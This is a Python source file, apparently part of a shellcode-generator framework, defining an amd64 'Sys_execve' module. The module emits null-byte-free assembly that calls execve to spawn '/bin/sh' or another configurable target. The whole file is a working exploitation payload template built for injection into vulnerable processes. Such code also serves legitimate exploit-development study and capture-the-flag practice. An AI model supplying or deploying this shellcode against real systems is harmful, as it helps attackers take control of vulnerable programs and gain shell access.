from ..BaseModule import BaseModule


class Module(BaseModule):
    @staticmethod
    def param_template():
        return {'exec_target': '/bin/sh'}

    def __init__(self):
        self.validate_exec_target = self._validate_all
        data = (
            'sh:\n'
            '    .ascii "{exec_target}"\n'
            'eol:\n'
            '    .byte 0xff\n'
        )
        code = (
            'exec:\n'
            '    xorl %eax, %eax\n'
            '    movb %al, eol(%rip)\n'
            '    leaq sh(%rip), %rdi\n'
            '    # sys_execve\n'
            '    movb $59, %al\n'
            '    xorl %edx, %edx\n'
            '    xorl %esi, %esi\n'
            '    syscall\n'
        )

        super().__init__(
            name='Sys_execve', arch='amd64',
            code=code, data=data
        )
